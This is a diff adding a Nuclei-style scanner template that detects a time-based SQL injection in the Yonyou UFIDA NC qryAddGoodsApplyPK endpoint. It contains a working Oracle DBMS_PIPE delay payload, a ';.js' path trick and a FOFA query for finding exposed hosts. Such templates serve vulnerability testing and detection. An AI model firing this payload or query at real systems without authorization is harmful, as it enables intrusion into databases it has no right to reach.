@@ -1,0 +1,32 @@
+id: yonyou-nc-qryAddGoodsApplyPK-sqli
+
+info:
+  name: 用友 UFIDA NC qryAddGoodsApplyPK.js - sqli
+  author: msk
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
+  tags: yonyou,nc,sqli,oa,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /ebvp/other/qryAddGoodsApplyPK;.js?billno=1'+AND+7554%3dDBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(87)||CHR(74)||CHR(112),6)+AND+'ldrk'%3d'ldrk HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
+        Accept-Encoding: identity
+        Connection: close
+        Content-Type: text/xml; charset=utf-8
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(header,'ebvp')
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
